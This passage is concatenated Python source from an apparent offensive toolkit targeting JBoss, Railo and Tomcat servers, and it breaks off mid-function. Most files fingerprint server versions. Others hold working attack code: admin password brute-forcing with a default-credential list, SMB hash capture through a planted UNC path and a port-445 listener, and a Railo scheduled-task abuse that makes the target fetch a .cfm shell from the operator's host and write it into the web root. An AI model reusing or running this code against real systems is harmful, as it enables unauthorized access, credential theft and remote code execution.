__FILENAME__ = JBossEJBInvoker
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint
from requests import exceptions
from hashlib import md5
from log import LOG
import utility

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "jboss"
        self.version = "Any"
        self.title = JINTERFACES.EIN
        self.uri = "/invoker/EJBInvokerServlet"
        self.port = 8080
        self.hash = "186c0e8a910b87dfd98ae0f746eb4879"

    def check(self, ip, port=None):
        """
        """

        try:
            rport = self.port if port is None else port
            request = utility.requests_get("http://{0}:{1}{2}".format(
                                    ip, rport, self.uri))

            compare_hash = md5(request.content[:44]).hexdigest()
            if compare_hash == self.hash:
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                          ip, rport),
                                                          LOG.DEBUG)
        return False

########NEW FILE########
__FILENAME__ = JBossHeaders
from src.platform.jboss.interfaces import JINTERFACES
from requests import exceptions
from log import LOG
from cprint import FingerPrint
import utility


class FPrint(FingerPrint):

    def __init__(self):
        self.platform = 'jboss'
        self.version = 'Any'
        self.title = JINTERFACES.HD
        self.uri = "/"
        self.port = 8080
        self.hash = None

    def check(self, ip, port = None):
        """ This fingerprint is used to check HTTP headers from the responding
        server.  I explicitely note how unreliable these are, as there are
        many instaces were the results may be incorrect/inconclusive.
        """

        versions = {
                      "JBoss-3.2" : "3.2",
                      "JBoss-4.0" : "4.0",
                      "JBoss-4.2" : "4.2",
                      "JBoss-5.0" : "5.0",  # could be 5.0 or 5.1, treat as 5.0
                      "JBossAS-6" : "6.0"   # could be 6.0 or 6.1, treat as 6.0
                   }

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}".format(ip, rport)

            response = utility.requests_get(url)
            if 'x-powered-by' in response.headers:
                powered_by = response.headers['x-powered-by']
                for val in versions.keys():
                    if val in powered_by:
                        self.version = versions[val]
                        return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip,
                                                    rport), LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                    ip, rport), LOG.DEBUG)

        return False            

########NEW FILE########
__FILENAME__ = JBossJMXInvoker
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint
from requests import exceptions
from hashlib import md5
from log import LOG
import utility

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "jboss"
        self.version = "Any"
        self.title = JINTERFACES.JIN
        self.uri = "/invoker/JMXInvokerServlet"
        self.port = 8080
        self.hash = "186c0e8a910b87dfd98ae0f746eb4879"

    def check(self, ip, port=None):
        """
        """

        try:
            rport = self.port if port is None else port
            request = utility.requests_get("http://{0}:{1}{2}".format(
                                    ip, rport, self.uri))

            compare_hash = md5(request.content[:44]).hexdigest()
            if compare_hash == self.hash:
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                          ip, rport),
                                                          LOG.DEBUG)
        return False

########NEW FILE########
__FILENAME__ = JBossRMI
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint
from log import LOG
import state
import utility
import socket


class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "jboss"
        self.version = "Any"
        self.title = JINTERFACES.RMI
        self.uri = None
        self.port = 4444
        self.hash = None

    def check(self, ip, port = None):
        """
        """

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(state.timeout)
            res = sock.connect_ex((ip, self.port))
            
            if res == 0:
                return True

        except Exception, e:
            utility.Msg(e, LOG.ERROR)

        return False

########NEW FILE########
__FILENAME__ = JBossStatus
from src.platform.jboss.interfaces import JINTERFACES
from cprint import FingerPrint
from log import LOG
from requests import exceptions
import utility


class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "jboss"
        self.version = "Any"
        self.title = JINTERFACES.STS
        self.uri = "/status?full=true"
        self.port = 8080
        self.hash = None


    def check(self, ip, port = None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

            response = utility.requests_get(url)
            if response.status_code == 401:
                utility.Msg("Host %s:%s requires auth for %s, checking.." % 
                                        (ip, rport, self.uri), LOG.DEBUG)

                cookies = checkAuth(ip, rport, self.title, self.version)
                if cookies:
                    response = utility.requests_get(url, cookies=cookies[0],
                                                    auth=cookies[1])
                else:
                    utility.Msg("Could not get auth for %s:%s" % (ip, rport), LOG.ERROR)
                    return False

            if response.status_code == 200:
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip,
                                                        rport), LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                    ip, rport), LOG.DEBUG)

        return False

########NEW FILE########
__FILENAME__ = interfaces
from cprint import FingerPrint
from requests import exceptions
from HTMLParser import HTMLParser
from log import LOG
from re import search
import authenticate
import utility


class JINTERFACES:
    """ JBoss interface 'enums'; exposes a commonality between 
    fingerprints and deployers or auxiliary modules.
    """

    JMX = "JBoss JMX Console"
    WC = "JBoss Web Console"
    WM = "JBoss Web Manager"
    MM = "JBoss Management"
    JIN = "JBoss JMX Invoker Servlet"
    EIN = "JBoss EJB Invoker Servlet"
    RMI = "JBoss RMI Interface"
    STS = "JBoss Status Page"
    HD = "JBoss HTTP Headers (Unreliable)"


class WebConsoleInterface(FingerPrint):
    """ This interface defines the Web Console interface for JBoss.
    Only versions 3.x - 5.x have this, and thus will not be available
    or have fingerprints for anything 6.x and up.
    """

    def __init__(self):
        self.platform = 'jboss'
        self.version = None
        self.title = JINTERFACES.WC
        self.uri = "/web-console/ServerInfo.jsp"
        self.port = 8080
        self.hash = None

    def check(self, ip, port = None):
        """ The version string for the web-console is pretty easy to parse out.
        """

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

            response = utility.requests_get(url)
            if response.status_code == 401:
                utility.Msg("Host %s:%s requires auth for /web-console, checking.." %
                                    (ip, rport), LOG.DEBUG)

                cookies = authenticate.checkAuth(ip, rport, self.title, self.version)
                if cookies:
                    response = utility.requests_get(url, cookies=cookies[0],
                                                    auth=cookies[1])
                else:
                    utility.Msg("Could not get auth for %s:%s" % (ip, rport), LOG.ERROR)
                    return False

            if "Version: </b>{0}".format(self.version) in response.content:
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                          ip, rport),
                                                          LOG.DEBUG)

        return False


class JMXInterface(FingerPrint):
    """ This interface defines the JMX console fingerprint.  This is only
    available in versions 3.x - 6.x, and is parsed in three different formats.
    """

    def __init__(self):
        self.platform = 'jboss'
        self.version = None
        self.title = JINTERFACES.JMX
        self.uri = "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Atype%3DServer"
        self.port = 8080
        self.hash = None

    def check(self, ip, port = None):
        """ Because the version strings are different across a couple
        different versions, we parse it a little bit different.  Pre-5.x versions
        are simple, as we match a pattern, whereas post-5.x versions require us
        to parse an HTML table for our value.
        """

        re_match = False
        rport = self.port if port is None else port
        url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

        try:

            request = utility.requests_get(url)

            # go check auth
            if request.status_code == 401:
                utility.Msg("Host %s:%s requires auth for JMX, checking..." %
                                                        (ip, rport), LOG.DEBUG)
                cookies = authenticate.checkAuth(ip, rport, self.title, self.version)
                if cookies:
                    request = utility.requests_get(url, cookies=cookies[0],
                                                        auth=cookies[1])
                else:
                    utility.Msg("Could not get auth for %s:%s" % (ip, rport), LOG.ERROR)
                    return False

            if request.status_code != 200:
                return False

            if self.version in ["3.0", "3.2"]:
                match = search("{0}.(.*?)\(".format(self.version), request.content)

                if match and len(match.groups()) > 0:
                    re_match = True

            elif self.version in ["4.0", "4.2"]:
                match = search("{0}.(.*?)GA".format(self.version), request.content)

                if match and len(match.groups()) > 0:
                    re_match = True

            elif self.version in ["5.0", "5.1", "6.0", "6.1"]:
                parser = TableParser()
                parser.feed(request.content)

                if parser.data and self.version in parser.data:
                    re_match = True

            return re_match

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport),
                                                        LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                          ip, rport),
                                                          LOG.DEBUG)
        return re_match


class TableParser(HTMLParser):
    """ Table parser for the jmx-console page; obtains the VersionNumber
    string from the page.  Little bit messy.
    """

    def __init__(self):
        HTMLParser.__init__(self)
        self.data = None
        self.in_td = False
        self.vn = False
        self.found = False

    def handle_starttag(self, tag, attrs):
        if tag == 'td':
            self.in_td = True
        elif tag == 'pre' and self.vn:
            self.found = True

    def handle_data(self, data):
        if self.in_td:
            if data == 'VersionNumber':
                self.vn = True

        if self.found:
            self.data = data.rstrip('\r\n ').lstrip('\r\n')
            self.found = False
            self.vn = False

    def handle_endtag(self, tag):
        self.in_td = False

########NEW FILE########
__FILENAME__ = undeployer
from src.platform.jboss.authenticate import checkAuth
from src.platform.jboss.interfaces import JINTERFACES
from collections import OrderedDict
from log import LOG
from re import findall
import utility

titles = [JINTERFACES.JMX]
def undeploy(fingerengine, fingerprint):
    """
    """

    if fingerprint.title is JINTERFACES.JMX:
        return jmx_undeploy(fingerengine, fingerprint)


def jmx_undeploy(fingerengine, fingerprint):
    """
    """

    context = fingerengine.options.undeploy
    # ensure leading / is stripped
    context = context if not '/' in context else context[1:]
    # check for trailing war
    context = context if '.war' in context else context + '.war'

    url = "http://{0}:{1}/jmx-console/HtmlAdaptor".format(
                    fingerengine.options.ip, fingerprint.port)

    wid = fetchId(context, url)
    if not wid:
        utility.Msg("Could not find ID for WAR {0}".format(context), LOG.ERROR)
        return

    data = OrderedDict([
                    ('action', 'invokeOp'),
                    ('name', 'jboss.web.deployment:war={0},id={1}'.format(context, wid)),
                    ('methodIndex', 0)
                    ])

    response = utility.requests_post(url, data=data)
    if response.status_code == 401:

        utility.Msg("Host %s:%s requires auth, checking..." %
                        (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            response = utility.requests_post(url, data=data, cookies=cookies[0],
                                            auth=cookies[1])
        else:
            utility.Msg("Could not get auth for %s:%s" %
                            (fingerengine.options.ip, fingerprint.port), LOG.ERROR)

    if response.status_code == 200:
        utility.Msg("{0} undeployed.  WAR may still show under list".format(context)) 


def fetchId(context, url):
    """ Undeployments require a CSRF token
    """

    response = utility.requests_get(url)
    data = findall("id=(.*?),war={0}".format(context), response.content)
    if len(data) > 0:
        return data[0]

########NEW FILE########
__FILENAME__ = authenticate
from src.platform.railo.interfaces import RINTERFACES
from requests.utils import dict_from_cookiejar
from collections import OrderedDict
from sys import stdout
from log import LOG
import state
import utility


def _auth(pswd, url, title):
    """ Support auth for both the web and server interfaces
    """            

    data = OrderedDict([ 
                ("lang", "en"),
                ("rememberMe", "yyyy"),
                ("submit", "submit")
            ])
    
    if title is RINTERFACES.WEB:            
        data["login_passwordweb"] =  pswd
    elif title is RINTERFACES.SRV:
        data['login_passwordserver'] = pswd

    response = utility.requests_post(url, data=data)
    if response.status_code is 200 and "login.login_password" not in response.content:
        utility.Msg("Successfully authenticated with '%s'" % pswd, LOG.DEBUG)
        return dict_from_cookiejar(response.cookies)


def checkAuth(ip, port, title):
    """ Railo doesn't have usernames, so we only care about passwords
    """

    url = None            
    if title is RINTERFACES.WEB:
        url = "http://{0}:{1}/railo-context/admin/web.cfm".format(ip, port)
    elif title is RINTERFACES.SRV:
        url = "http://{0}:{1}/railo-context/admin/server.cfm".format(ip, port)

    if state.usr_auth:
        # check with given auth; handle both cases of "default" and ":default"
        if ':' in state.usr_auth:
            (_, pswd) = state.usr_auth.split(":")
        else:
            pswd = state.usr_auth
        return _auth(pswd, url, title)

    if state.bf_wordlist and not state.hasbf:

        state.hasbf = True
        wordlist = []
        with open(state.bf_wordlist, "r") as f:
            wordlist = [x.decode("ascii", "ignore").rstrip() for x in f.readlines()]

        utility.Msg("Brute forcing %s with %d passwords..." % (state.bf_user,
                                len(wordlist)), LOG.DEBUG)

        try:
            for (idx, word) in enumerate(wordlist):
                stdout.flush()
                stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m"
                                % (utility.timestamp(), state.bf_user, idx+1, len(wordlist)))

                cook = _auth(word, url, title)
                if cook:
                    print ''
                    utility.Msg("Successful login with %s" % word, LOG.SUCCESS)
                    return cook

            print ''

        except KeyboardInterrupt:
            pass

########NEW FILE########
__FILENAME__ = info_dump
from src.platform.railo.authenticate import checkAuth
from src.platform.railo.interfaces import RINTERFACES
from auxiliary import Auxiliary
from log import LOG
from re import findall
import utility

class Auxiliary:

    def __init__(self):
        self.name = 'Dump host information'
        self.versions = ['3.0', '3.3', '4.0', '4.1', '4.2']
        self.show = True
        self.flag = 'rl-info'

    def check(self, fingerprint):
        if fingerprint.title in [RINTERFACES.WEB] and \
                fingerprint.version in self.versions:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ Dump host OS info from a railo server
        """

        utility.Msg("Attempting to retrieve Railo info...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)

        uri = None
        if fingerprint.title is RINTERFACES.WEB:
            uri = '/railo-context/admin/web.cfm'
        elif fingerprint.title is RINTERFACES.SRV:
            uri = '/railo-context/admin/server.cfm'
        url = base + uri            

        response = utility.requests_get(url)
        if response.status_code is 200 and 'login' in response.content:

            utility.Msg("Host %s:%s requires auth, checking..." %
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookie = checkAuth(fingerengine.options.ip, fingerprint.port, 
                               fingerprint.title)
            
            if cookie:
                response = utility.requests_get(url, cookies=cookie)
            else:
                utility.Msg("Could not get auth for %s:%s" %
                                (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return

        if response.status_code is 200 and 'Overview' in response.content:

            (h, d) = self.fetchVersionRegex(fingerprint)
            headers = findall(h, response.content.translate(None, "\n\t\r"))
            data = findall(d, response.content.translate(None, "\n\t\r"))

            # do some version-specific trimming
            if fingerprint.version in ["4.1", '4.2']:
               headers = headers[4:]
               data = data[2:]
            elif fingerprint.version in ["3.0"]:
                headers = headers[:-6]
                data = data[:-6]
            elif fingerprint.version in ["3.3"]:
                headers = headers[:-7]
                data = data[:-7]

            for (th, td) in zip(headers, data):
                utility.Msg("\t%s: %s" % (th, td))                    

    def fetchVersionRegex(self, fingerprint):
        """ Information we need is represented differently, depending on
        the version.  This'll return a regex for matching specific items.
        """

        if fingerprint.version in ["3.0"]:
            return ("150\">(.*?)</td>", "400\">(.*?)</td>")
        elif fingerprint.version in ["3.3"]:            
            return ("150\">(.*?)</td>", "tblContent\">(.*?)</td>")
        elif fingerprint.version in ["4.0", "4.1", '4.2']:
            return ("\"row\">(.*?)</th>", "<td>(.*?)</td>")

########NEW FILE########
__FILENAME__ = smb_hashes
from src.platform.railo.authenticate import checkAuth
from src.platform.railo.interfaces import RINTERFACES
from src.lib.cifstrap import Handler
from auxiliary import Auxiliary
from threading import Thread
from time import sleep
from os import getuid
from log import LOG
import socket
import utility
import state


class Auxiliary:

    def __init__(self):
        self.name = 'Obtain SMB hash'
        self.versions = ['3.3', '4.0']
        self.show = True
        self.flag = 'rl-smb'
        self._Listen = False

    def check(self, fingerprint):
        if fingerprint.version in self.versions and fingerprint.title \
                in [RINTERFACES.WEB]:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ Create a search collection via a nonexistent
        datasource
        """

        if getuid() > 0:
            utility.Msg("Root privs required for this module.", LOG.ERROR)
            return

        utility.Msg("Setting up SMB listener...")

        self._Listen = True
        thread = Thread(target=self.smb_listener)
        thread.start()

        utility.Msg("Invoking UNC deployer...")

        base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
        uri = "/railo-context/admin/web.cfm?action=services.search"
        data = { "collName" : "asdf",
                 "collPath" : "\\\\{0}\\asdf".format(utility.local_address()),
                 "collLanguage" : "english",
                 "run" : "create"
               }

        url = base + uri
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title)
        if not cookies:
            utility.Msg("Could not get auth for %s:%s" % (fingerengine.options.ip,
                                                          fingerprint.port),
                                                          LOG.ERROR)
            self._Listen = False
            return

        response = utility.requests_post(url, data=data, cookies=cookies)

        while thread.is_alive():
            # spin...
            sleep(1)

        if response.status_code != 200:

            utility.Msg("Unexpected response: HTTP %d" % response.status_code)

        self._Listen = False

    def smb_listener(self):
        """ Accept a connection and pass it off for parsing to cifstrap
        """

        try:
            handler = None
            sock = socket.socket()
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(state.timeout)
            sock.bind(('', 445))
            sock.listen(1)

            while self._Listen:
                try:
                    (con, addr) = sock.accept()
                except:
                    # timeout
                    return

                handler = Handler(con, addr)
                handler.start()

                while handler.is_alive():
                    # spin...
                    sleep(1)

                if handler.data:
                    utility.Msg("%s" % handler.data, LOG.SUCCESS)

                break

        except Exception, e:
            utility.Msg("Socket error: %s" % e, LOG.ERROR)
        finally:
            sock.close()

########NEW FILE########
__FILENAME__ = schedule_task
from src.platform.railo.interfaces import RINTERFACES
from src.platform.railo.authenticate import checkAuth
from src.module.deploy_utils import _serve, waitServe, parse_war_path, killServe
from collections import OrderedDict
from os.path import abspath
from log import LOG
from threading import Thread
from re import findall
from time import sleep
import utility
import state


title = RINTERFACES.WEB
versions = ["3.0", "3.3", "4.0", "4.1", "4.2"]
global cookie
def deploy(fingerengine, fingerprint):
    """ Railo includes the same task scheduling function as ColdFusion
    """

    global cookie            

    cfm_path = abspath(fingerengine.options.deploy)            
    cfm_file = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    # set our session cookie
    cookie = checkAuth(dip, fingerprint.port, title)
    if not cookie:
        utility.Msg("Could not get auth to %s:%s" % (dip, fingerprint.port),
                                                    LOG.ERROR)
        return

    utility.Msg("Preparing to deploy {0}..".format(cfm_file))
    utility.Msg("Fetching web root..", LOG.DEBUG)

    # fetch web root; i.e. where we can read the shell
    root = fetch_webroot(dip, fingerprint)
    if not root:
        utility.Msg("Unable to fetch web root.", LOG.ERROR)
        return

    # create the scheduled task        
    utility.Msg("Web root found at %s" % root, LOG.DEBUG)
    utility.Msg("Creating scheduled task...")

    if not create_task(dip, fingerprint, cfm_file, root):
        return

    # invoke the task
    utility.Msg("Task %s created, invoking..." % cfm_file)
    run_task(dip, fingerprint, cfm_path)
        
    # remove the task
    utility.Msg("Cleaning up...")
    delete_task(dip, fingerprint, cfm_file)


def fetch_webroot(ip, fingerprint):
    """ Grab web root from the info page
    """

    global cookie            
    _cookie = cookie

    url = "http://{0}:{1}/railo-context/admin/".format(ip, fingerprint.port)
    if fingerprint.version in ["3.0"]:
        url += "server.cfm"
        _cookie = checkAuth(ip, fingerprint.port, RINTERFACES.SRV)
    else:
        url += "web.cfm"

    response = utility.requests_get(url, cookies=_cookie)
    if response.status_code is 200:

        if fingerprint.version in ["3.0"]:
            data = findall("path1\" value=\"(.*?)\" ", 
                            response.content.translate(None, "\n\t\r"))
        elif fingerprint.version in ["3.3"]:
            data = findall("Webroot</td><td class=\"tblContent\">(.*?)</td>", 
                            response.content.translate(None, "\n\t\r"))
        else:
            data = findall("Webroot</th><td>(.*?)</td>",
                            response.content.translate(None, "\n\t\r"))

        if len(data) > 0:
            return data[0]


def create_task(ip, fingerprint, cfm_file, root):
    """
    """

    global cookie            

    base = "http://{0}:{1}/railo-context/admin/web.cfm".format(ip, fingerprint.port)
    params = "?action=services.schedule&action2=create"
    data = OrderedDict([
                    ("name", cfm_file),
                    ("url", "http://{0}:{1}/{2}".format(
                           utility.local_address(), state.external_port,
                           cfm_file)),
                    ("interval", "once"),
                    ("start_day", "01"),
                    ("start_month", "01"),
                    ("start_year", "2020"),
                    ("start_hour", "00"),
                    ("start_minute", "00"),
                    ("start_second", "00"),
                    ("run", "create")
                     ])

    response = utility.requests_post(base + params, data=data, cookies=cookie)
    if not response.status_code is 200 and cfm_file not in response.content:
        return False
    
    # pull the CSRF for our newly minted task
    csrf = findall("task=(.*?)\"", response.content)
    if len(data) > 0:
        csrf = csrf[0]
    else:
        utility.Msg("Could not pull CSRF token of new task (failed to create?)", LOG.DEBUG)
        return False

    # proceed to edit the task; railo loses its mind if every var isnt here
    params = "?action=services.schedule&action2=edit&task=" + csrf
    data["port"] = state.external_port
    data["timeout"] = 50
    data["run"] = "update"
    data["publish"] = "yes"
    data["file"] = root + '\\' + cfm_file
    data["_interval"] = "once"
    data["username"] = ""
    data["password"] = ""
    data["proxyport"] = ""
    data["proxyserver"] = ""
    data["proxyuser"] = ""
    data["proxypassword"] = ""
    data["end_hour"] = ""
    data["end_minute"] = ""
    data["end_second"] = ""
    data["end_day"] = ""
    data["end_month"] = ""
    data["end_year"] = ""

    response = utility.requests_post(base + params, data=data, cookies=cookie)
    if response.status_code is 200 and cfm_file in response.content:
        return True

    return False        


def run_task(ip, fingerprint, cfm_path):
    """
    """

    global cookie
    cfm_file = parse_war_path(cfm_path, True)

    # kick up server
    server_thread = Thread(target=_serve, args=(cfm_path,))
    server_thread.start()
    sleep(2)

    base = "http://{0}:{1}/railo-context/admin/web.cfm".format(ip, fingerprint.port)
    params = "?action=services.schedule"
    data = OrderedDict([
                    ("row_1", "1"),
                    ("name_1", cfm_file),
                    ("mainAction", "execute")
                      ])

    response = utility.requests_post(base + params, data=data, cookies=cookie)
    if waitServe(server_thread):
        utility.Msg("{0} deployed to /{0}".format(cfm_file), LOG.SUCCESS)

    killServe()


def delete_task(ip, fingerprint, cfm_file):
    """
    """

    global cookie            
    
    base = "http://{0}:{1}/railo-context/admin/web.cfm".format(ip, fingerprint.port)
    params = "?action=services.schedule"
    data = OrderedDict([
                    ("row_1", "1"),
                    ("name_1", cfm_file),
                    ("mainAction", "delete")
                    ])

    response = utility.requests_post(base + params, data=data, cookies=cookie)
    if response.status_code is 200:
        return True

########NEW FILE########
__FILENAME__ = Railo33
from src.platform.railo.interfaces import DefaultServer


class FPrint(DefaultServer):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.3"

########NEW FILE########
__FILENAME__ = Railo33Server
from src.platform.railo.interfaces import ServerAdmin


class FPrint(ServerAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.3"

########NEW FILE########
__FILENAME__ = Railo33Web
from src.platform.railo.interfaces import WebAdmin


class FPrint(WebAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.3"

########NEW FILE########
__FILENAME__ = Railo3Server
from src.platform.railo.interfaces import ServerAdmin


class FPrint(ServerAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.0"

########NEW FILE########
__FILENAME__ = Railo3Web
from src.platform.railo.interfaces import WebAdmin


class FPrint(WebAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "3.0"

########NEW FILE########
__FILENAME__ = Railo4
from src.platform.railo.interfaces import DefaultServer


class FPrint(DefaultServer):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.0"

########NEW FILE########
__FILENAME__ = Railo41
from src.platform.railo.interfaces import DefaultServer


class FPrint(DefaultServer):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.1"

########NEW FILE########
__FILENAME__ = Railo41Server
from src.platform.railo.interfaces import ServerAdmin


class FPrint(ServerAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.1"

########NEW FILE########
__FILENAME__ = Railo41Web
from src.platform.railo.interfaces import WebAdmin


class FPrint(WebAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.1"

########NEW FILE########
__FILENAME__ = Railo42
from src.platform.railo.interfaces import DefaultServer


class FPrint(DefaultServer):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.2"

########NEW FILE########
__FILENAME__ = Railo42Server
from src.platform.railo.interfaces import ServerAdmin


class FPrint(ServerAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.2"

########NEW FILE########
__FILENAME__ = Railo42Web
from src.platform.railo.interfaces import WebAdmin


class FPrint(WebAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.2"

########NEW FILE########
__FILENAME__ = Railo4Server
from src.platform.railo.interfaces import ServerAdmin


class FPrint(ServerAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.0"

########NEW FILE########
__FILENAME__ = Railo4Web
from src.platform.railo.interfaces import WebAdmin


class FPrint(WebAdmin):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "4.0"

########NEW FILE########
__FILENAME__ = interfaces
from cprint import FingerPrint
from requests import exceptions
from log import LOG
from re import findall
import utility


class RINTERFACES:
    DSR = "Railo Server"        
    WEB = "Railo Web Administrator"
    SRV = "Railo Server Administrator"
    AJP = "Railo AJP"

class WebAdmin(FingerPrint):
    """ Fingerprint interface for the web admin page
    """

    def __init__(self):            
        self.platform = 'railo'
        self.version = None
        self.title = RINTERFACES.WEB
        self.uri = '/railo-context/admin/web.cfm'
        self.port = 8888
        self.hash = None

    def check(self, ip, port = None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = 'http://{0}:{1}{2}'.format(ip, rport, self.uri)

            response = utility.requests_get(url)
            if response.status_code is 200:
                if checkError(url, self.version):
                    return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip,
                                                        rport), LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error {1}:{2}".format(self.platform, ip,
                                                        rport), LOG.DEBUG)

        return False


class ServerAdmin(FingerPrint):
    """ Fingerprint interface for the server admin page
    """

    def __init__(self):
        self.platform = 'railo'
        self.version = None
        self.title = RINTERFACES.SRV
        self.uri = '/railo-context/admin/server.cfm'
        self.port = 8888
        self.hash = None

    def check(self, ip, port = None):     
        """
        """

        try:
            rport = self.port if port is None else port
            url = 'http://{0}:{1}{2}'.format(ip, rport, self.uri)

            response = utility.requests_get(url)
            if response.status_code is 200:
                if checkError(url, self.version):
                    return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform,
                                                        ip, rport), LOG.DEBUG)
        except exceptions.ConnectionError:            
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                        ip, rport), LOG.DEBUG)

        return False            


class DefaultServer(FingerPrint):
    """ This tests for the default welcome page at /
    """

    def __init__(self):
        self.platform = 'railo'
        self.version = None
        self.title = RINTERFACES.DSR
        self.uri = '/'
        self.port = 8888
        self.hash = None

    def check(self, ip, port = None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = 'http://{0}:{1}{2}'.format(ip, rport, self.uri)

            response = utility.requests_get(url)
            if response.status_code is 200:
                
                data = findall("<title>Welcome to Railo (.*?)</title>", response.content)
                if len(data) > 0 and self.version in data[0]:
                    return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip,
                                                        rport), LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                          ip, rport), LOG.DEBUG)

        return False            


def checkError(url, version):
    """ There isn't any versioning information listed on the web/server admin
    pages, so instead we trigger an error and read the debugging info.  This is on
    by default for all versions of Railo.
    """

    try:
        url += ".cfm"

        response = utility.requests_get(url)
        if response.status_code == 404:

            data = findall("\">Railo \d.\d", response.content)
            if len(data) > 0 and version in data[0]:
                return True

    except exceptions.Timeout:
        utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip, rport),
                                                    LOG.DEBUG)
    except exceptions.ConnectionError:
        utility.Msg("{0} connection error to {1}:{2}".format(self.platform, 
                                                      ip, rport), LOG.DEBUG)
    return False                

########NEW FILE########
__FILENAME__ = authenticate
from src.platform.tomcat.interfaces import TINTERFACES
from requests.auth import HTTPBasicAuth
from requests.utils import dict_from_cookiejar
from sys import stdout
from log import LOG
import state
import utility

default_credentials = [("tomcat", "tomcat"),
                       ("role1", "role1"),
                       ("admin", "admin"),
                       ("both", "tomcat"),
                       ("admin", "changethis")]

def _auth(usr, pswd, url):
    """
    """
    res = utility.requests_get(url, auth=HTTPBasicAuth(usr, pswd))

    if res.status_code is 200:
        utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
        return (dict_from_cookiejar(res.cookies), HTTPBasicAuth(usr, pswd))


def checkAuth(ip, port, title, version):
    """
    """

    if title == TINTERFACES.MAN:

        url = "http://{0}:{1}/manager/html".format(ip, port)

        # check with given auth
        if state.usr_auth:
            (usr, pswd) = state.usr_auth.split(":")
            return _auth(usr, pswd, url)

        # else try default credentials
        for (usr, pswd) in default_credentials:
            cook = _auth(usr, pswd, url)
            if cook:
                return cook

        # if we're still here, check if they supplied a wordlist
        if state.bf_wordlist and not state.hasbf:
            
            state.hasbf = True
            wordlist = []
            with open(state.bf_wordlist, "r") as f:
                wordlist = [x.decode("ascii", "ignore").rstrip() for x in f.readlines()]

            utility.Msg("Brute forcing %s account with %d passwords..." %
                                (state.bf_user, len(wordlist)), LOG.DEBUG)

            try:
                for (idx, word) in enumerate(wordlist):
                    stdout.flush()
